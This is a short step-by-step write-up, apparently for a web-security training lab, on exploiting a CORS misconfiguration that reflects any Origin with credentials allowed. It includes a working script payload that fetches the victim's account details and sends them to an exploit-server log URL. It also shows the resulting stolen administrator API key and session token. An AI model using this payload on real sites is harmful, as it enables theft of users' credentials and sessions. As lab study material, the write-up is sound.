```javascript

1. Open the lab and login with the credentials
2. Navigate to the Burp HTTP history and look for the request /accountDetails

RESPONSE
It has  Access-Control-Allow-Credentials: true

TEST 1
Add the header Origin: https://google.com to the request and send it

RESULT 1
Access-Control-Allow-Origin: https://google.com  --  Response from the server  --  We can request the credentials from any host without restriction

PAYLOAD

<script>
fetch("https://0a9e00c303e8d9da823842ad004200da.web-security-academy.net/accountDetails", {
    credentials: "include"
})
.then(r => r.text())
.then(data => {
    location = "https://exploit-0a2700fc0305d9c682494181016d0080.exploit-server.net/log?key="
               + encodeURIComponent(data);
});
</script>

3. Go to exploit server and deliver this payload to the victim
4. Open access log and copy the response and Decode as URL

{
  "username": "administrator",
  "email": "",
  "apikey": "vWvH3ugsJvcJnaYDpvcJgEMztrhDQ2to",
  "sessions": [
    "NdvdvGAyCCqZDE4VD5tZqXFmFgTCBZgj"
  ]
}

5. Submit the API key and done

```
